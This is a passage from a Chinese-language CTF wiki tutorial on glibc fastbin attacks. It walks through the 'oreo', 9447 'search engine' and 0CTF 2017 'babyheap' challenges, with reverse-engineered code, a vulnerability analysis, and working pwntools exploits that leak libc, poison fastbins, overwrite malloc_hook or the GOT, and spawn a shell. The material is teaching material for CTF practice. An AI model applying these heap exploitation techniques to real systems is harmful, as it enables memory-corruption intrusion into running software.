    binsh_addr = libc_base + next(libc.search('/bin/sh'))

    print 'step 2. free fake chunk at 0x0804A2A8'

    # now, oifle_cnt=1, we need set it = 0x40
    oifle = 1
    while oifle < 0x3f:
        # set next link=NULL
        add(25 * 'a', 'a' * 27 + p32(0))
        oifle += 1
    payload = 'a' * 27 + p32(0x0804a2a8)
    # set next link=0x0804A2A8, try to free a fake chunk
    add(25 * 'a', payload)
    # before free, we need to bypass some check
    # fake chunk's size is 0x40
    # 0x20 *'a' for padding the last fake chunk
    # 0x40 for fake chunk's next chunk's prev_size
    # 0x100 for fake chunk's next chunk's size
    # set fake iofle' next to be NULL
    payload = 0x20 * '\x00' + p32(0x40) + p32(0x100)
    payload = payload.ljust(52, 'b')
    payload += p32(0)
    payload = payload.ljust(128, 'c')
    message(payload)
    # fastbin 0x40: 0x0804A2A0->some where heap->NULL
    order()
    p.recvuntil('Okay order submitted!\n')

    print 'step 3. get shell'
    # modify free@got to system addr
    payload = p32(oreo.got['strlen']).ljust(20, 'a')
    add(payload, 'b' * 20)
    log.success('system addr: ' + hex(system_addr))
    #gdb.attach(p)
    message(p32(system_addr) + ';/bin/sh\x00')

    p.interactive()


if __name__ == "__main__":
    exp()

```

當然，該題目也可以使用 `fast bin attack` 中的其它技術來實現，可參考參考文獻中的鏈接。

## 2015 9447 CTF : Search Engine
[題目鏈接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2015_9447ctf_search-engine)

### 基本信息

```shell
➜  2015_9447ctf_search-engine git:(master) file search
search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped
➜  2015_9447ctf_search-engine git:(master) checksec search
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled

```

### 基本功能

程序的基本功能是

- 索引一個句子
  - 大小v0，(unsigned int)(v0 - 1) > 0xFFFD
  - 讀取的字符串長度必須和給定的大小相等
  - 每次索引的句子都是直接在直接建立在前面的句子上的。
- 在一個句子中搜索單詞
  - 大小v0，(unsigned int)(v0 - 1) > 0xFFFD
- 讀取指定長度字符串
  - 如果有回車標記
    - 在指定長度內沒有遇到回車，則讀完沒有設置NULL標記
    - 在指定長度內遇到回車，就截斷返回。
  - 沒有回車標記
    - 讀夠指定長度，沒有NULL標記結尾。

### 詞語結構體

通過分析索引句子的過程，我們可以得到詞語的結構如下

```
00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)
00000000 content         dq ?
00000008 size            dd ?
0000000C padding1        dd ?
00000010 sentence_ptr    dq ?                    ; offset
00000018 len             dd ?
0000001C padding2        dd ?
00000020 next            dq ?                    ; offset
00000028 word_struct     ends
```

### 堆內存相關操作

分配

- malloc 40 字節爲一個word結構體
- 爲句子或者單詞 malloc 指定大小。

釋放

- 釋放刪除的句子
- 釋放刪除句子所搜索的臨時單詞
- 釋放索引句子時未使用的單詞結構

### 漏洞

**索引句子讀取字符串時無NULL結尾**

在索引句子時 flag_enter 永遠爲 0，所以讀取句子時最後沒有 NULL 結尾。

```c
    _flag_enter = flag_enter;
    v4 = 0;
    while ( 1 )
    {
      v5 = &s[v4];
      v6 = fread(&s[v4], 1uLL, 1uLL, stdin);
      if ( v6 <= 0 )
        break;
      if ( *v5 == '\n' && _flag_enter )
      {
        if ( v4 )
        {
          *v5 = 0;
          return;
        }
        v4 = v6 - 1;
        if ( len <= v6 - 1 )
          break;
      }
      else
      {
        v4 += v6;
        if ( len <= v4 )
          break;
      }
    }
```

**讀取選擇操作數**

```c
__int64 read_num()
{
  __int64 result; // rax
  char *endptr; // [rsp+8h] [rbp-50h]
  char nptr; // [rsp+10h] [rbp-48h]
  unsigned __int64 v3; // [rsp+48h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  read_str(&nptr, 48, 1);
  result = strtol(&nptr, &endptr, 0);
  if ( endptr == &nptr )
  {
    __printf_chk(1LL, "%s is not a valid number\n", &nptr);
    result = read_num();
  }
  __readfsqword(0x28u);
  return result;
}
```

因爲 read_str 不設置NULL ，因此，如果 nptr 讀取的不合法的話，就有可能會 leak 出棧上的內容。

**索引句子釋放未置NULL**

```c
  else
  {
    free(v6);
  }
```

**搜索詞語中刪除詞語時，對應句子指針只是釋放，並沒有設置爲NULL**

```c
  for ( i = head; i; i = i->next )
  {
    if ( *i->sentence_ptr )
    {
      if ( LODWORD(i->size) == v0 && !memcmp((const void *)i->content, v1, v0) )
      {
        __printf_chk(1LL, "Found %d: ", LODWORD(i->len));
        fwrite(i->sentence_ptr, 1uLL, SLODWORD(i->len), stdout);
        putchar('\n');
        puts("Delete this sentence (y/n)?");
        read_str(&choice, 2, 1);
        if ( choice == 'y' )
        {
          memset(i->sentence_ptr, 0, SLODWORD(i->len));
          free(i->sentence_ptr);
          puts("Deleted!");
        }
      }
    }
  }
  free(v1);
```

可以看出，在每次釋放 i->sentence_ptr 之前，這個句子的內容就會全部被設置爲 `\x00` ，由於單詞結構體中存儲的單詞只是句子的一個指針，所以單詞也會被置爲 `\x00` 。該句子對應的那些單詞仍然是存在於鏈表中的，並沒有被刪除，因此每次搜索單詞的時候，仍然會判斷。看起來由於句子內容被置爲 `\x00` 可以防止通過 `*i->sentence_ptr` 驗證。然而，由於 chunk 被釋放後會被放到 bin 中，當 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的時候，也就有可能會產生 double free 的情況。此外，當句子被 `memset` 的時候，單詞雖然都變爲了 `\x00` ，但是我們仍然可以通過兩個 `\x00` 的比較來繞過 `memcmp` 的檢測。

### 利用

#### 利用思路

基本利用思路如下

- 利用 unsorted bin 地址泄漏 libc 基地址
- 利用 double free 構造 fastbin 循環鏈表
- 分配 chunk 到 malloc_hook 附近，修改malloc_hook 爲 one_gadget

#### 泄漏 libc 地址

這裏我們分配一個 small bin 大小的 chunk ，當它被釋放後，就會放入到 unsorted bin 中。因而，只要 `unsorted bin` 的地址的起始字節不是 `\x00` 便可以通過驗證。同時，我們可以構造 `\x00` 來進行比較，從而通過驗證。具體如下

```python
def leak_libc():
    smallbin_sentence = 's' * 0x85 + ' m '
    index_sentence(smallbin_sentence)
    search_word('m')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('y')
    search_word('\x00')
    p.recvuntil('Found ' + str(len(smallbin_sentence)) + ': ')
    unsortedbin_addr = u64(p.recv(8))
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('n')
    return unsortedbin_addr
```

#### 構造 fastbin 循環鏈表

由於我們最後希望在 malloc_hook 處分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是0x7f。即，我們所需要設置的設置的 fast bin 的數據字節部分的大小爲 0x60。這裏我們按照如下方式構造

1. 分別索引句子a，索引句子b，索引句子c，則此時單詞鏈表中索引的句子的相對順序爲c->b->a。假設句子 a 爲'a' * 0x5d+' d '，句子 b 爲 'b' * 0x5d+' d '，句子c類似。
2. 索引單詞d，三個均刪除，則此時 fastbin 中的鏈表情況爲 a->b->c->NULL，這是因爲首先釋放的是句子c，最後釋放的是句子 a 。這時，搜索單詞時`*i->sentence_ptr` 對於a, b 來說都是可以繞過的。
3. 我們此時再次刪除搜索單詞 `\x00`。首先遍歷的是 c，但是 c 的驗證不通過；其次遍歷的是b，驗證通過，我們將其釋放；其次遍歷的是a，驗證通過，但是我們不刪除。則此時 fastbin 的情況爲 b->a->b->a->...。即已經構成了double free b的情況。由於我們先前爲了 leak libc 還建立一個句子，所以還有一個單詞可以比較，這裏我們也不刪除。

具體代碼如下

```python
    # 2. create cycle fastbin 0x70 size
    index_sentence('a' * 0x5d + ' d ')  #a
    index_sentence('b' * 0x5d + ' d ')  #b
    index_sentence('c' * 0x5d + ' d ')  #c

    # a->b->c->NULL
    search_word('d')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('y')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('y')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('y')

    # b->a->b->a->...
    search_word('\x00')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('y')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('n')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('n')
```

效果如下

```shell
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x1d19320 ◂— 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x1d191b0 —▸ 0x1d19010 —▸ 0x1d191b0 ◂— 0x1d19010
0x80: 0x0
```

#### 分配 malloc_hook 附近chunk

此時，fastbin 的鏈表爲 b->a->b->a->…，則我們可以在申請第一個相同大小的 chunk 時，設置 b 的 fd 爲 malloc_hook 附近處的 chunk `0x7fd798586aed`（這裏是舉一個例子，代碼中需使用相對地址）。

```shell
pwndbg> print (void*)&main_arena
$1 = (void *) 0x7fd798586b20 <main_arena>
pwndbg> x/8gx 0x7fd798586b20-16
0x7fd798586b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7fd798586b20 <main_arena>:	0x0000000000000000	0x0000000000bce130
0x7fd798586b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7fd798586b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
pwndbg> find_fake_fast 0x7fd798586b10 0x7f
FAKE CHUNKS
0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA {
  prev_size = 15535264025435701248,
  size = 127,
  fd = 0xd798247e20000000,
  bk = 0xd798247a0000007f,
  fd_nextsize = 0x7f,
  bk_nextsize = 0x0
}
pwndbg> print /x 0x7fd798586b10-0x7fd798586aed
$2 = 0x23
pwndbg> print /x 0x7fd798586b20-0x7fd798586aed
$3 = 0x33

```

那麼當再次分配 b 的時候，由於此時 b 的 fd 已經被我們修改爲了malloc_hook附近的地址，所以這時候我們再次分配一個 chunk，就會指向 `0x7fd798586aed`。 此後便只需要將 malloc_hook 修改爲 one_gadget 地址就可以拿到 shell 了。

```python
    # 3. fastbin attack to malloc_hook nearby chunk
    fake_chunk_addr = main_arena_addr - 0x33
    fake_chunk = p64(fake_chunk_addr).ljust(0x60, 'f')

    index_sentence(fake_chunk)

    index_sentence('a' * 0x60)

    index_sentence('b' * 0x60)

    one_gadget_addr = libc_base + 0xf02a4
    payload = 'a' * 0x13 + p64(one_gadget_addr)
    payload = payload.ljust(0x60, 'f')
    #gdb.attach(p)
    index_sentence(payload)
    p.interactive()
```

這裏可能需要多選擇幾個 one_gadget 地址，因爲 one_gadget 成功是有條件的。

#### shell

```shell
➜  2015_9447ctf_search-engine git:(master) python exp.py
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Starting local process './search': pid 31158
[*] PID: 31158
[+] unsortedbin addr: 0x7f802e73bb78
[+] libc base addr: 0x7f802e377000
[*] Switching to interactive mode
Enter the sentence:
$ ls
exp.py       search      search.id1  search.nam
libc.so.6  search.id0  search.id2  search.til
```

當然，這裏還有一種[方法](https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/)，將 chunk 分配到棧上。

## 2017 0ctf babyheap
[題目鏈接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2017_0ctf_babyheap)

### 基本信息

```shell
➜  2017_0ctf_babyheap git:(master) file babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
➜  2017_0ctf_babyheap git:(master) checksec babyheap
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

64位程序，保護全部開啓。

### 基本功能

程序是一個堆分配器，主要由以下四種功能

```c
  puts("1. Allocate");
  puts("2. Fill");
  puts("3. Free");
  puts("4. Dump");
  puts("5. Exit");
  return printf("Command: ");
```

其中，每次讀取命令的函數由讀取指定長度的字符串的函數而決定。

通過分配函數

```c
void __fastcall allocate(__int64 a1)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = read_num();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

申請的 chunk 的最大爲 4096。此外，我們可以看出每個 chunk 主要有三個字段：是否在使用，堆塊大小，堆塊位置。故而我們可以創建對應的結構體。

```
00000000 chunk           struc ; (sizeof=0x18, mappedto_6)
00000000 inuse           dq ?
00000008 size            dq ?
00000010 ptr             dq ?
00000018 chunk           ends
```

**需要注意的是堆塊是由 calloc 分配的，所以 chunk 中的內容全都爲`\x00`。**

在填充內容的功能中，使用讀取內容的函數是直接讀取指定長度的內容，並沒有設置字符串結尾。**而且比較有意思的是，這個指定長度是我們指定的，並不是之前 chunk 分配時指定的長度，所以這裏就出現了任意堆溢出的情形。**

```c
__int64 __fastcall fill(chunk *a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = read_num();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = LODWORD(a1[(signed int)result].inuse);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = read_num();
      v3 = result;
      if ( (signed int)result > 0 )
      {
        printf("Content: ");
        result = read_content((char *)a1[v2].ptr, v3);
      }
    }
  }
  return result;
}
```

在釋放chunk的功能中該設置的都設置了。

```c
__int64 __fastcall free_chunk(chunk *a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = read_num();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = LODWORD(a1[(signed int)result].inuse);
    if ( (_DWORD)result == 1 )
    {
      LODWORD(a1[v2].inuse) = 0;
      a1[v2].size = 0LL;
      free(a1[v2].ptr);
      result = (__int64)&a1[v2];
      *(_QWORD *)(result + 16) = 0LL;
    }
  }
  return result;
}
```

dump 就是輸出對應索引 chunk 的內容。

### 利用思路

可以確定的是，我們主要有的漏洞就是任意長度堆溢出。由於該程序幾乎所有保護都開啓了，所以我們必須要有一些泄漏纔可以控制程序的流程。基本利用思路如下

- 利用 unsorted bin 地址泄漏 libc 基地址。
- 利用 fastbin attack 將chunk 分配到 malloc_hook 附近。

#### 泄漏 libc 基地址

由於我們是希望使用 unsorted bin 來泄漏 libc 基地址，所以必須要有 chunk 可以被鏈接到 unsorted bin 中，所以該 chunk 不能使 fastbin chunk，也不能和 top chunk 相鄰。因爲前者會被添加到 fastbin 中，後者在不是fastbin 的情況下，會被合併到 top chunk 中。因此，我們這裏構造一個 small bin chunk。在將該 chunk 釋放到 unsorted bin 的同時，也需要讓另外一個正在使用的 chunk 可以同時指向該 chunk 的位置。這樣纔可以進行泄漏。具體設計如下

```Python
    # 1. leak libc base
    allocate(0x10)  # idx 0, 0x00
    allocate(0x10)  # idx 1, 0x20
    allocate(0x10)  # idx 2, 0x40
    allocate(0x10)  # idx 3, 0x60
    allocate(0x80)  # idx 4, 0x80
    # free idx 1, 2, fastbin[0]->idx1->idx2->NULL
    free(2)
    free(1)
```

首先，我們申請了 5 個chunk，並釋放了兩個chunk，此時堆的情況如下。

```shell
pwndbg> x/20gx 0x55a03ca22000
0x55a03ca22000:	0x0000000000000000	0x0000000000000021 idx 0
0x55a03ca22010:	0x0000000000000000	0x0000000000000000
0x55a03ca22020:	0x0000000000000000	0x0000000000000021 idx 1
0x55a03ca22030:	0x000055a03ca22040	0x0000000000000000
0x55a03ca22040:	0x0000000000000000	0x0000000000000021 idx 2
0x55a03ca22050:	0x0000000000000000	0x0000000000000000
0x55a03ca22060:	0x0000000000000000	0x0000000000000021 idx 3
0x55a03ca22070:	0x0000000000000000	0x0000000000000000
0x55a03ca22080:	0x0000000000000000	0x0000000000000091 idx 4
0x55a03ca22090:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins
fastbins
0x20: 0x55a03ca22020 —▸ 0x55a03ca22040 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0

```

當我們編輯 idx0 後，確實已經將其指向idx4了。這裏之所以可以成功是因爲堆的始終是 4KB 對齊的，所以idx 4的起始地址的第一個字節必然是0x80。

```python
    # edit idx 0 chunk to particial overwrite idx1's fd to point to idx4
    payload = 0x10 * 'a' + p64(0) + p64(0x21) + p8(0x80)
    fill(0, len(payload), payload)
```

修改成功後如下

```shell
pwndbg> x/20gx 0x55a03ca22000
0x55a03ca22000:	0x0000000000000000	0x0000000000000021
0x55a03ca22010:	0x6161616161616161	0x6161616161616161
0x55a03ca22020:	0x0000000000000000	0x0000000000000021
0x55a03ca22030:	0x000055a03ca22080	0x0000000000000000
0x55a03ca22040:	0x0000000000000000	0x0000000000000021
0x55a03ca22050:	0x0000000000000000	0x0000000000000000
0x55a03ca22060:	0x0000000000000000	0x0000000000000021
0x55a03ca22070:	0x0000000000000000	0x0000000000000000
0x55a03ca22080:	0x0000000000000000	0x0000000000000091
0x55a03ca22090:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins
fastbins
0x20: 0x55a03ca22020 —▸ 0x55a03ca22080 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

那麼，當我們再次申請兩個時，第二個申請到的就是idx 4處的chunk。爲了能夠申請成功，我們需要確保 idx4 的size 與當前 fastbin 的大小一致，所以，我們得修改它的大小。申請成功後，idx2會指向idx4。

```python
    # if we want to allocate at idx4, we must set it's size as 0x21
    payload = 0x10 * 'a' + p64(0) + p64(0x21)
    fill(3, len(payload), payload)
    allocate(0x10)  # idx 1
    allocate(0x10)  # idx 2, which point to idx4's location
```

之後，如果我們想要將 idx 4 放到 unsorted bin 中的話，爲了防止其與top chunk 合併，我們需要再次申請一個chunk。此後再釋放 idx4 就會進入 unsorted bin中去了。此時由於 idx2 也指向這個地址，所以我們直接展示他的內容就可以得到unsorted bin的地址了。

```python
    # if want to free idx4 to unsorted bin, we must fix its size
    payload = 0x10 * 'a' + p64(0) + p64(0x91)
    fill(3, len(payload), payload)
    # allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk
    allocate(0x80)  # idx 5
    free(4)
    # as idx 2 point to idx4, just show this
    dump(2)
    p.recvuntil('Content: \n')
    unsortedbin_addr = u64(p.recv(8))
    main_arena = unsortedbin_addr - offset_unsortedbin_main_arena
    log.success('main arena addr: ' + hex(main_arena))
    main_arena_offset = 0x3c4b20
    libc_base = main_arena - main_arena_offset
    log.success('libc base addr: ' + hex(libc_base))
```

#### 分配chunk到malloc_hook附近

由於 malloc hook 附近的 chunk 大小爲 0x7f，所以數據區域爲0x60。這裏我們再次申請的時候，對應 fastbin 鏈表中沒有相應大小chunk，所以根據堆分配器規則，它會依次處理unsorted bin中的chunk，將其放入到對應的bin中，之後會再次嘗試分配 chunk，因爲之前釋放的 chunk 比當前申請的 chunk 大，所以可以從其前面分割出來一塊。所以 idx2 仍然指向該位置，那麼我們可以使用類似的辦法先釋放申請到的chunk，然後再次修改 fd 指針爲 fake chunk 即可。此後我們修改 malloc_hook 處的指針即可得到觸發 onegadget。

```Python
# 2. malloc to malloc_hook nearby
# allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4
allocate(0x60)
free(4)
# edit idx4's fd point to fake chunk
fake_chunk_addr = main_arena - 0x33
fake_chunk = p64(fake_chunk_addr)
fill(2, len(fake_chunk), fake_chunk)

allocate(0x60)  # idx 4
allocate(0x60)  # idx 6

one_gadget_addr = libc_base + 0x4526a
payload = 0x13 * 'a' + p64(one_gadget_addr)
fill(6, len(payload), payload)
# trigger malloc_hook
allocate(0x100)
p.interactive()
```
同時，這裏的 onegadget 地址也可能需要嘗試多次。

## 題目

- L-CTF2016–pwn200

## 參考文獻

- https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/
- http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html
- https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717
